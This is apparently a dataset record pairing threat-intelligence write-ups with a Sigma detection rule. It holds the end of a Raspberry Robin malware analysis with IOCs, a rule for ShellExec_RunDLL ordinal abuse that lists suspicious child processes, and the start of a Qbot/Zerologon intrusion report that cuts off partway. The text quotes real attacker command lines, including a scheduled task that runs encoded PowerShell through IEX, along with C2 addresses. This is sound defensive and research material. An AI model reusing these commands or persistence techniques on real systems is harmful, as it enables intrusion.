uncommon in the cybercriminal economy, where attackers purchase “loads” or installs from operators of successful and widespread malware to facilitate their goals.\n\n```image\nAlt: This diagram shows Raspberry Robin worm's connections to various malware campaigns and threat operators. It also shows different infection methods seen in Raspberry Robin-related activity.\nDescription: The image is a detailed diagram illustrating the infection chain and connectivity of the Raspberry Robin worm to various malware campaigns and threat operators. It includes initial infection vectors such as malicious ads and attacker-controlled servers, leading to different malware types like ROSHTYAK and LockBit ransomware. The diagram outlines specific malware variants, their deployment dates, and interaction with human-operated ransomware intrusions, emphasizing the interconnected nature of cyber threats.\nTranscription: |\n  Initial infection vectors\n  -------------------------\n  - Malicious ads\n  - Attacker-controlled intermediary server (DEV-0651)\n  - Command-and-control to compromised QNAP\n  - FAUPPOD-packed malware\n  - Public cloud infrastructure (e.g., Azure, Discord, GitHub, and SpiderOak)\n  \n  Connections to other malware\n  -----------------------------\n  - DEV-0206: FakeUpdates/SocGholish JavaScript\n  - DEV-0856: ROSHTYAK malware\n    - More Raspberry Robin victims via LNK USB infection\n  - DEV-0243: Cobalt Strike and interactive human-operated ransomware intrusion\n  - LockBit ransomware\n  - DEV-0249: IcedID\n  - DEV-0249: Bumblebee\n  - DEV-0950: Cobalt Strike and interactive human-operated ransomware intrusion\n  - Clop ransomware\n  - DEV-0950: Truebot\n```\n\n_Figure 4. Raspberry Robin’s connectivity to a larger cybercriminal ecosystem_\n\n### Introducing Fauppod: Like FakeUpdates but without the fake updates\n\nOn July 26, 2022, Microsoft witnessed the first reported instance of a Raspberry Robin-infected host deploying a FakeUpdates (also known as SocGholish) JavaScript backdoor. Previously, FakeUpdates were delivered primarily through drive-by downloads or malicious ads masquerading as browser updates. Microsoft tracks the activity group behind FakeUpdates as DEV-0206 and the USB-based Raspberry Robin infection operators as DEV-0856.\n\nAfter discovering Raspberry Robin-deployed FakeUpdates, Microsoft security researchers continued monitoring for other previously unidentified methodologies in FakeUpdates deployments. Research into the various malware families dropped by Raspberry Robin’s USB-delivered infections continued, and new signatures were created to track the various outer layers of packed malware under the family name Fauppod.\n\nOn July 27, 2022, Microsoft identified samples detected as Fauppod that have similar process trees with DLLs written by Raspberry Robin LNK infections in similar locations and using similar naming conventions. Their infection chains also dropped the FakeUpdates malware. However, the victim hosts where these samples were detected didn’t have the traditional infection vector of an LNK file launched from an infected USB drive, as detailed in Red Canary’s blog.\n\nIn this instance, Fauppod was delivered via _codeload[.]github[.]com_, a fraudulent and malicious repository created by a cybercriminal actor that Microsoft tracks as DEV-0651. The payload was delivered as a ZIP archive file containing another ZIP file, which then had a massive (700MB) Control Panel (CPL) file inside. Attackers use nested containers such as ZIP, RAR, and ISO files to avoid having their malicious payloads stamped with Mark of the Web (MOTW), which Windows uses to mark files from the internet and thus enable security solutions to block certain actions. Control Panel files are similar to other PEs like EXE and DLL files.\n\nMicrosoft has since seen DEV-0651 deliver Fauppod samples by taking advantage of various public-facing trusted and legitimate cloud services beyond GitHub, including Azure, Discord, and SpiderOak. Refer to the indicators of compromise (IOCs) below for more details. Microsoft has shared information about this threat activity and service abuse with these hosting providers.\n\n### Connecting the dot(net malware)\n\nWith the discovery of the DEV-0651 link, Microsoft had two pieces of evidence suggesting a relationship between Fauppod and Raspberry Robin:\n\n- Both malware families were delivering FakeUpdates\n- Signatures created to detect Raspberry Robin DLL samples on hosts infected by the publicly known LNK file spreading mechanism were detecting malware that wasn’t being delivered through any previously known Raspberry Robin connections\n\nFollowing DEV-0651’s previous leveraging of cloud hosting services, the earliest iteration of a DEV-0651-related campaign that Microsoft was able to identify occurred in September 2021, which was around the same time Red Canary stated Raspberry Robin began to propagate.\n\nBased on these facts, Microsoft reached low-confidence assessment that the Fauppod malware samples were related to the later delivery of what was publicly known as Raspberry Robin and started investigating these links to raise confidence and discover more information.\n\nWhile authoring both file-based and behavior-based detections for Fauppod samples, Microsoft utilized existing detections based on the use of OBDCCONF as a LOLBin to launch _regsvr32_ (which was also detailed in Red Canary’s blog as a Raspberry Robin tactic, technique, and procedure (TTP)):\n\n```image\nAlt: Screenshot of commands using ODBCCONF as a proxy for regsvr execution\nDescription: The image contains a screenshot of command lines executed using the 'rundll32.exe' utility. It demonstrates the execution of a Shell command with parameters for loading a DLL file through 'ShellExec_RunDLL'. The command also incorporates a path to 'odbcconf' for registration, along with additional parameters indicating the installation of a driver. The presence of a specific DLL path and parameters suggests a technique used in malware execution, specifically related to the Raspberry Robin worm and its propagation method.\nTranscription: |\n  \"rundll32.exe\" SHELL32,ShellExec_RunDLL\n  \"C:\\WINDOWS\\syswow64\\odbccconf\" -s /c -A {regsvr\n  \"C:\\ProgramData\\Mzcvi\\adagmkc.lj.\"} /A {installdriver UBJWEBCPC CNKFAEJCRGH} /A {INSTALLTRANSLATOR}\n```\n\n_Figure 5. ODBCCONF being used as a proxy for regsvr execution, similar to Red Canary’s blog on Raspberry Robin_\n\nMicrosoft noted a unique quality in the command execution that was persistent through all Raspberry Robin infections stemming from an infected USB drive: there was a trailing “.” character at the end of the DLL name within the command above.\n\nWhile reviewing DEV-0651 Fauppod-delivered malware, Microsoft identified a Fauppod CPL sample served via GitHub when the following command is run:\n\n```image\nAlt: Screenshot of commands generated by DEV-0651's Fauppod CPL\nDescription: The image displays a screenshot of command-line instructions related to malware execution. The commands include the use of 'RUNDLL32.EXE' to execute 'shell32.dll' with 'ShellExec_RunDLL', and 'MSIEXEC.EXE' with various parameters. The paths reference system directories and a randomly named directory under 'ProgramData', indicating a method of executing malicious payloads, consistent with behaviors associated with the Raspberry Robin and Fauppod malware.\nTranscription: |\n  C:\\WINDOWS\\system32\\RUNDLL32.EXE shell32.dll,ShellExec_RunDLL\n  \"C:\\WINDOWS\\syswow64\\MSIEXEC.EXE\" -passive kwxqphxvuxcqb=JVHSVRNQYKIDCWK -promptrestart /z\n  \"C:\\ProgramData\\Jyfedj\\hfttnnm.ea.\" /PROMPTSTART\n```\n\n_Figure 6. DEV-0651 Fauppod CPL generated command line_\n\nNotable in the above Fauppod command are the following:\n\n- The use of _msiexec.exe_ to launch the Windows binary _shell32.dll_ as a LOLBin, instead of launching the malware PE directly via _rundll32.exe_, using _rundll32.exe_ to launch _shell32.dll_, and passing _ShellExec_RunDLL_ to load the commands—a TTP consistent with Raspberry Robin.\n- Fauppod CPL file’s use of a staging directory to copy a payload to disk using randomly generated directories in _ProgramData_ that then contain malicious PE files with randomly generated names and extensions. This naming pattern overlaps with those leveraged by publicly known Raspberry Robin DLLs.\n- The same trailing “.” in the DLL name as seen in the ODBCCONF proxying detailed in Red Canary’s blog. Avast also later noted this trailing in the DLL implant dropped by Raspberry Robin, which they refer to as Roshtyak.\n\nThese findings raised Microsoft’s confidence in assessing whether there is a connection between Fauppod’s CPL files and Raspberry Robin extending beyond a similarity in outer layers and packing of the malware.\n\nMicrosoft security researchers also identified a payload within a Fauppod sample communicating with a compromised QNAP storage server to send information about the infected device, overlapping with Raspberry Robin’s use of compromised QNAP appliances for C2.\n\nWhile continuing to monitor the prevalence and infection sources of Fauppod, Microsoft identified a heavily obfuscated .NET malware (SHA-256: a9d5ec72fad42a197cbadcb1edc6811e3a8dd8c674df473fd8fa952ba0a23c15) arriving on hosts that had previously been infected with either Raspberry Robin LNK infected hosts or Fauppod CPL malware.\n\n```image\nAlt: This screenshot shows the .NET DLL execution where the folder names are generated from combining two words from the dictionary.\nDescription: The image displays a command line execution screenshot showing the use of 'rundll32.EXE' to invoke a dynamically linked library (DLL) located in 'C:\\ProgramData\\GradeExperience\\'. The DLL file is named 'voicednws_St1_4' and suggests a complex directory structure with obfuscated names. This reflects a technique used in the propagation of malware, specifically related to the Raspberry Robin infection chain discussed in the provided context.\nTranscription: |\n  C:\\WINDOWS\\system32\\rundll32.EXE\n  C:\\ProgramData\\GradeExperience\\EergnitionPing\\uinsoht_Wvdenrl.dll,voicednws_St1_4\n```\n\n_Figure 7. .NET spreader DLL execution, via _rundll32_, with an export of _voicednws_St1_4_; the randomly generated directory structure of using two dictionary words is consistent across a significant number of infected hosts_\n\n```image\nAlt: This screenshot of the DNSpy app user interface shows the obfuscation of the .NET DLL file believed to be creating Raspberry Robin LNK files in USB drives.\nDescription: The image displays a screenshot from the DNSpy application, which is used for inspecting .NET assemblies. On the left side, the Assembly Explorer shows the structure of the 'unished_Wdwn.dll' file, including its base type definitions and various methods. On the right side, you can see the C# code of the assembly, highlighting method definitions and potential malware behavior. This screenshot is relevant as it demonstrates the obfuscation of a .NET DLL believed to be related to the Raspberry Robin malware, providing insights into its functionality and structure.\nTranscription: |\n  using System;\n  using System.Collections;\n  using System.Runtime.InteropServices;\n  using System.Text;\n  \n  namespace DOACIL_Help_IMB\n  {\n      public class hostxnt_wep1sig\n      {\n          // Token: 0x000000B8 RID: 184\n          private static void GlobalsInit()\n          {\n              if (hostxnt_wep1sig.aasds1_systemR0 != null && (uint)hostxnt_wep1sig.aasds1_systemR0.Length > 0)\n              {\n                  int num = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[234]);\n                  uint system_outbuilder = hostxnt_wep1sig.System_outbuilder;\n                  if (num != 0)\n                  {\n                      if (num == 1)\n                      {\n                          int num2 = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[89]);\n                          int num3 = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[120]);\n                          double num4 = num3 + num2;\n                          hostxnt_wep1sig.G0sPa_Resourc1;\n                      }\n                      else\n                      {\n                          uint num5 = num1;\n                      }\n                  }\n              }\n          }\n      }\n  }\n```\n\n_Figure 8. DNSpy screenshot of a highly obfuscated .NET DLL assessed to be responsible for creating Raspberry Robin LNK files on external USB drives_\n\nWhile inspecting these samples, Microsoft noted that many were responsible for creating LNK files on external USB drives.\n\nBased on our investigation, Microsoft currently assesses with medium confidence that the above .NET DLLs delivered both by Raspberry Robin LNK infections and Fauppod CPL samples are responsible for spreading Raspberry Robin LNK files to USB drives. These LNK files, in turn, infect other hosts via the infection chain detailed in Red Canary’s blog.\n\nMicrosoft also assesses with medium confidence that the Fauppod-packed CPL samples are currently the earliest known point in the attack chain for propagating Raspberry Robin infections to targets. Microsoft findings suggest that the Fauppod CPL entities, the obfuscated .NET LNK spreader modules they drop, the Raspberry Robin LNK files Red Canary documented, and the Raspberry Robin DLL files (or, Roshtyak, as per Avast) could all be considered as various components to the “Raspberry Robin” malware infection chain.\n\n### The Fauppod-Dridex connection\n\nIn July 2022, Microsoft found Raspberry Robin infections that led to hands-on-keyboard activity by DEV-0243. One of the earliest malware campaigns to bring notoriety to DEV-0243 was the Dridex banking trojan.\n\nCode similarity between malware families is often used to demonstrate a link between families to a tracked actor. In IBM’s blog post published after we observed the Raspberry Robin and DEV-0243 connection, they highlighted several code similarities between the loader for the Raspberry Robin DLLs and the Dridex malware.\n\nMicrosoft’s analysis of Fauppod samples also identified some Dridex filename testing features, which are used to avoid running in certain environments. Fauppod has similar functionality to avoid execution if it recognizes it’s running as _testapp.exe_ or _self.exe_. This code similarity has historically caused some Fauppod samples to trip Dridex detection alerts.\n\n```image\nAlt: Screenshot of Fauppod code that shows commands related to its anti-investigation techniques.\nDescription: The image is a screenshot of code related to the Fauppod malware, highlighting commands that demonstrate its anti-investigation techniques. It specifically shows two segments of code that look for the presence of filenames \"self.exe\" and \"testapp.exe\" using API calls like `GetModuleHandleA` and `LoadLibraryW`. The highlighted sections illustrate how the malware avoids execution in certain environments, which is a technique linked to previous Dridex samples.\nTranscription: |\n  text:00401010\n  sub_401010 proc near              ; CODE XREF: DllEntryPoint:loc_401001\n  var_D          = byte ptr -0Ch\n  var_C          = dword ptr -8\n  var_8          = dword ptr -4\n  var_4          = dword ptr -0\n  push ebp\n  mov ebp, esp\n  sub esp, 14h\n  xor eax, eax\n  mov eax, ds:CloseHandle\n  cmp byte ptr [ecx], 08h\n  cmp [ebp+var_4], eax\n  jz short loc_401043\n  loc_401043:\n  mov eax, ds:GetCurrentThreadId\n  call eax\n  mov ecx, ds:OutputDebugStringA\n  cmp byte ptr [edx], 6Ah\n  cmp [ebp+var_8], eax\n  mov [ebp+var_4], ecx\n  jnz short loc_401078\n  loc_401048:\n  mov eax, esp\n  mov dword ptr [eax], offset aSelfExe ; \"self.exe\"\n  mov eax, ds:GetModuleHandleA\n  call eax\n  sub esp, 4\n  cmp eax, 0\n  mov [ebp+var_4], ecx\n  call sub_401070\n  loc_401070:\n  mov eax, esp\n  mov dword ptr [eax], offset aTestappExe ; \"testapp.exe\"\n  mov eax, ds:LoadLibraryW\n  call eax\n  sub esp, 4\n  cmp eax, 0\n  setz cl\n  mov eax, ecx\n  mov [ebp+var_4], cl\n  test cl, 1\n  jz short loc_401043\n  endp\n```\n\n_Figure 9. Screenshot highlighting _“self.exe”_ and _“testapp.exe”_ evasions in Fauppod using _GetModuleHandleA_ and _LoadLibraryW_ API calls, similar to previous Dridex samples_\n\nGiven the previously documented relationship between Raspberry Robin and DEV-0206/DEV-0243 (EvilCorp), this behavioral similarity in the initial vector for Raspberry Robin infections adds another piece of evidence to the connection between the development and propagation of Fauppod/Raspberry Robin and DEV-0206/DEV-0243.\n\n## Raspberry Robin’s future as part of the cybercriminal gig economy\n\nCybercriminal malware is an ever-present threat for most organizations today, taking advantage of common weaknesses in security strategies and using social engineering to trick users. Almost every organization risks encountering these threats, including Fauppod/Raspberry Robin and FakeUpdates. Developing a robust protection and detection strategy and investing in credential hygiene, least privileges, and network segmentation are keys to preventing the impact of these complex and highly connected cybercriminal threats.\n\nRaspberry Robin’s infection chain is a confusing and complicated map of multiple infection points that can lead to many different outcomes, even in scenarios where two hosts are infected simultaneously. There are numerous components involved; differentiating them could be challenging as the attackers behind the threat have gone to extreme lengths to protect the malware at each stage with complex loading mechanisms. These attackers also hand off to other actors for some of the more impactful attack stages, such as ransomware deployment.\n\nAs of this writing, Microsoft is aware of at least four confirmed Raspberry Robin entry vectors. These entry points were linked to hands-on-keyboard actions by attackers, and they all led to intrusions where the end goal was likely deployment of ransomware.\n\nInfections from Fauppod CPL files and the Raspberry Robin worm component have facilitated human-operated intrusions indicative of pre-ransomware activity. Based on the multiple infection stages and varied payloads, Microsoft assesses that DEV-0651’s initial access vector, the various spreading techniques of the malicious components, and high infection numbers have provided an attractive distribution option for follow-on payloads.\n\nBeginning on September 19, 2022, Microsoft identified Raspberry Robin worm infections deploying IcedID and—later at other victims—Bumblebee and TrueBot payloads. In October 2022, Microsoft researchers observed Raspberry Robin infections followed by Cobalt Strike activity from DEV-0950. This activity, which in some cases included a Truebot infection, eventually deployed the Clop ransomware.\n\n## Defending against Raspberry Robin infections\n\nWorms can be noisy and could lead to alert fatigue in security operations centers (SOCs). Such fatigue could lead to improper or untimely remediation, providing the worm operator ample opportunity to sell access to the affected network to other cybercriminals.\n\nWhile Raspberry Robin seemed to have no purpose when it was first discovered, it has evolved and is heading towards providing a potentially devastating impact on environments where it’s still installed. Raspberry Robin will likely continue to develop and lead to more malware distribution and cybercriminal activity group relationships as its install footprint grows.\n\nMicrosoft Defender for Endpoint and Microsoft Defender Antivirus detect Raspberry Robin and follow-on activities described in this blog. Defenders can also apply the following mitigations to reduce the impact of this threat:\n\n- Prevent drives from using autorun and execution code on insertion or mount. This can be done via registry settings or Group Policy.\n- Follow the defending against ransomware guidance in Microsoft’s RaaS blog post.\n- Enable tamper protection to prevent attacks from stopping or interfering with Microsoft Defender Antivirus.\n- Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.\n\nMicrosoft customers can turn on attack surface reduction rules to prevent several of the infection vectors of this threat. Attack surface reduction rules, which any security administrator can configure, offer significant hardening against the worm. In observed attacks, Microsoft customers who had the following rules enabled were able to mitigate the attack in the initial stages and prevent hands-on-keyboard activity:\n\n- Block untrusted and unsigned processes that run from USB\n- Block execution of potentially obfuscated scripts\n- Block executable files from running unless they meet a prevalence, age, or trusted list criterion\n- Block credential stealing from the Windows local security authority subsystem (lsass.exe)\n\nDefenders can also refer to detection details and indicators or compromise in the following sections for more information about surfacing this threat.\n\n## Detection details\n\n### Microsoft Defender Antivirus\n\nMicrosoft Defender Antivirus detects threat components as the following malware:\n\n- Trojan:Win32/Fauppod\n\nConfigure Defender Antivirus scans to include removable drives. The following command lets admins scan removable drives, such as flash drives, during a full scan using the Set-MpPreference cmdlet:\n\n```\nSet-MpPreference -DisableRemovableDriveScanning\n```\n\nIf you specify a value of _$False_ or do not specify a value, Defender Antivirus scans removable drives during any type of scan. If you specify a value of _$True_, Defender Antivirus doesn’t scan removable drives during a full scan. Defender Antivirus can still scan removable drives during quick scans or custom scans.\n\nDefender Antivirus also detects identified post-compromise payloads as the following malware:\n\n- Behavior:Win32/Socgolsh.SB\n- Trojan:JS/Socgolsh.A\n- Trojan:JS/FakeUpdate.C\n- Trojan:JS/FakeUpdate.B\n- Trojan:Win32/IcedId\n- Backdoor:Win32/Truebot\n- TrojanDownloader:Win32/Truebot\n- Trojan:Win32/Truebot\n- Trojan:Win32/Bumblebee.E\n\n### Microsoft Defender for Endpoint\n\nAlerts with the following titles in the security center can indicate threat activity on your network:\n\n- Potential Raspberry Robin worm command\n- Possible Raspberry Robin worm activity\n\nMicrosoft also clusters indicators related to the presence of the Raspberry Robin worm under DEV-0856. The following alert can indicate threat activity on your network:\n\n- DEV-0856 activity group\n\nThe following alerts might also indicate threat activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity and therefore are not monitored in the status cards provided with this report.\n\n- Suspicious process launched using cmd.exe\n- Suspicious behavior by msiexec.exe\n- Observed BumbleBee malware activity\n- Malware activity resembling Bumblebee loader detected\n- BumbleBeeLoader malware was prevented\n- Ransomware-linked emerging threat activity group detected\n- Ongoing hands-on-keyboard attacker activity detected (Cobalt Strike)\n- SocGholish command-and-control\n- Suspicious ‘Socgolsh’ behavior was blocked\n- DEV-0651 threat group activity associated with FakeUpdates JavaScript backdoor\n\n## Indicators of compromise (IOCs)\n\nNOTE: These indicators should not be considered exhaustive for this observed activity.\n\n**Fauppod samples delivered by DEV-0651 via legitimate cloud services**\n\n| Sample (SHA-256)                                                 | Related URL                                                                                                                                 | Related ad server    |\n| ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | -------------------- |\n| d1224c08da923517d65c164932ef8d931633e5376f74bf0655b72d559cc32fd2 | hxxps://codeload[.]github[.]com/downloader2607/download64_12/zip/refs/heads/main                                                            | ads[.]softupdt[.]com |\n| 0b214297e87360b3b7f6d687bdd7802992bc0e89b170d53bf403e536e07e396e | hxxps://spideroak[.]com/storage/OVPXG4DJMRSXE33BNNPWC5LUN5PTSMRTGAZTG/shared/5392194-1-1040/Setup_64_1.zip?b6755c86e52ceecf8d806bf814690691 | 146[.]70[.]93[.]10   |\n| f18a54ba72df1a17daf21b519ffeee8463cfc81c194a8759a698709f1c9a3e87 | hxxps://dsfdsfgb[.]azureedge[.]net/332_332/universupdatepluginx84.zip                                                                       | Unknown              |\n| 0c435aadaa3c42a71ad8ff80781def4c8ce085f960d75f15b6fee8df78b2ac38 | hxxps://cdn[.]discordapp[.]com/attachments/1004390520904220838/1008127492449648762/Setup_64_11.zip                                          | Unknown              |\n\n**Timeline of Raspberry Robin deployments of various payloads**\n\n| Date    | Sample (SHA-256)                                                                                                                                                                                                     | Malware   | Notes                                                                                           |\n| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------------------------------------------------------------- |\n| 9/19/22 | 1789ba9965adc0c51752e81016aec5749<br>377ec86ec9a30449b52b1a5857424bf                                                                                                                                                 | IcedID    | Configuration details: { “Campaign ID”: 2094382323, “C2 url”: “aviadronazhed[.]com” }       |\n| 9/28/22 | 5c15151a29fab8a2d58fa55aa6c88a58a45<br>6b0a6bc959b843e9ceb2295c61885<br>09247f88d47b69e8d50f0fe4c10c7f0ecc95<br>c979a38c2f7dfee4aec3679b5807<br>f0115a8c173d30369acc86cb8c68d870c8c<br>f8a2b0b74d72f9dbba30d80f05614 | Bumblebee | Bumblebee called out to a Cobalt Strike Beacon server (guteyutur[.]com) shortly after execution |\n| 9/30/22 | 7e39dcd15307e7de862b9b42bf556f2836b<br>f7916faab0604a052c82c19e306ca                                                                                                                                                 | TrueBot   |                                                                                                 |",
    "sigma_rule": {
      "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
      "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
      "related": [
        {
          "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009",
        "https://strontic.github.io/xcyclopedia/library/shell32.dll-65DA072F25DE83D9F83653E3FEA3644D.html"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent_img": {
          "ParentCommandLine|contains": "SHELL32.DLL"
        },
        "selection_parent_ordinal": {
          "ParentCommandLine|contains": [
            "#568",
            "#570",
            "#572",
            "#576"
          ]
        },
        "selection_susp_cli_parent": [
          {
            "ParentCommandLine|contains": [
              "comspec",
              "iex",
              "Invoke-",
              "msiexec",
              "odbcconf",
              "regsvr32"
            ]
          },
          {
            "ParentCommandLine|contains": [
              "\\Desktop\\",
              "\\ProgramData\\",
              "\\Temp\\",
              "\\Users\\Public\\"
            ]
          }
        ],
        "selection_susp_child_img": {
          "Image|endswith": [
            "\\bash.exe",
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\cscript.exe",
            "\\curl.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\msxsl.exe",
            "\\odbcconf.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\schtasks.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "all of selection_parent_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml",
    "id": "465"
  },
  {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise\n\n**Categories:** adfind, cobaltstrike, Qbot\n\n**Published on:** February 21, 2022\n\nIn this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware.\n\nSoon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network.\n\n### Summary\n\nThe threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user.\n\nFollowing the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task’s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes.\n\nOnce the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as `Nltest`, `net`, and `ADFind`.\n\nUpon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named `cool.exe` resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations.\n\nThe domain admin hash was then used on the beachhead through an over-pass-the-hash attack. After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.\n\nFinally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS). To conclude this case, the threat actors were evicted from the network before they completed any further objectives.\n\n### Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Qbot and Zerologon Lead To Full Domain Compromise\nDescription: The image is a detailed timeline chart illustrating the sequence of events related to Qbot and Zerologon vulnerabilities leading to a full domain compromise. It outlines specific timestamps and activities, such as the execution of Qbot DLL, Cobalt Strike discovery, and various network and service interactions. The chart includes commands and actions taken during the attack, making it a comprehensive reference for understanding the progression of the compromise.\nTranscription: |\n  Qbot and Zerologon Lead To Full Domain Compromise\n  \n  16:31 UTC Initial Qbot DLL execution on Beachhead\n      rundll32.exe C:\\Users\\[REDACTED] e2bc6949442adc97345ac811d345f68a386 2laad3c7ae2740a8fa582987.dll,#1\n  \n  16:37 First Qbot C2 activity and discovery activity\n      net localgroup, net share, net view /all, netstat -nao, rout print, ...\n  \n  16:40 DLL dropped by Qbot\n  \n  16:40 Scheduled task created for persistence\n      base64 encoded PowerShell script executed every 30 minutes\n  \n  16:46 C2 begins - Cobalt Strike\n      5.255.98.144:8888\n      dxabt.com\n  \n  17:00 Cobalt Strike discovery\n      nltest.exe /domain_trusts\n      nltest.exe /all_trusts\n      net group \"domain admins\" /domain\n      net group \"domain controllers\" /domain\n      ping -n 1 DOMAINCONTROLLER\n  \n  17:03 ZeroLogon exploit on the first Domain Controller\n      Password of DC was changed\n      Service was installed on the DC\n  \n  17:10 Cobalt Strike Beacon via service installation on the Domain Controller\n  \n  17:12 ADFind discovery from Beachhead\n      find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  \n  17:12 Over-Pass-The-Hash performed with DA hash on Beachhead\n  \n  17:15 Cobalt Strike Beacon via service installation on another Domain Controller\n  \n  17:31 Security software discovery + Ping + ADFind on the second Domain Controller\n      cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /Value\n      cmd.exe /C C:\\[REDACTED]\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > C:\\[REDACTED]\\ce.csv\n      cmd.exe /C ping -n 1 SERVER\n  \n  17:35 UTC Cobalt Strike Beacon via service installation on a file server\n  \n  17:37 UTC RDP connection from BeachHead to Domain Controller and a file server\n  \n  17:56 UTC Alerts triggered from canary document indicating open from Host at IP 91.192.182.[*]165\n```\n\n### Initial Access\n\nThe threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here.\n\nThe execution chain for this QBot infection can be seen below:\n\n```image\nAlt: Qbot Chain\nDescription: The image depicts a detailed execution chain for a Qbot infection. It outlines the steps taken by the malware, starting with the execution of a malicious DLL via 'rundll32.exe'. It shows the injection process into 'explorer.exe' and subsequent connections to two IP addresses, along with the execution of various discovery commands. The steps are categorized into Execution, Discovery, Defense Evasion, and Command and Control, with a legend indicating the color-coding for each category. The image provides specific command line instructions and paths used during the infection process.\nTranscription: |\n  rundll32.exe C:\\Users\\<redacted>\\Downloads\\e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987.dll, #1\n  \n  1. starts & injects into:\n     - C:\\Windows\\SysWOW64\\explorer.exe\n  \n  2. connects to:\n     - 41.228.22.180:443\n     - 24.229.150.54:995\n  \n  3. Runs discovery commands:\n     - whoami /all\n     - net view /all\n     - netstat -ano\n     - cmd /c set\n     - net share\n     - net localgroup\n     - ipconfig /all\n     - route print\n     - arp -a\n     - nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.<redacted>\n  \n  4. Executes:\n     - regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxkgymyv.dll\"\n     - schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa)))\" /SC MINUTE /MO 30\n```\n\n### Execution\n\n#### QBot PowerShell analysis\n\nWe analyzed the registry path and associated keys that were queried by the scheduled task `HKCU:\\SOFTWARE\\Pvoeooxf` and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in:\n\n1. Copy of QBot DLL\n2. String of QBot C2 IP-addresses separated by a semicolon.\n3. Obfuscated PowerShell script that is referenced by the scheduled task.\n\n```image\nAlt: PowerShell Script\nDescription: The image displays a screenshot of a Windows Registry Editor window, showcasing three registry entries. Each entry has a value name, value type, and data. The entries appear to contain base64 encoded information, likely related to the QBot malware, as indicated by the context provided. The data represents encoded values that could be associated with the malware's configuration or payloads.\n```\n\nThe PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:\n\n```image\nAlt: PowerShell Chain\nDescription: 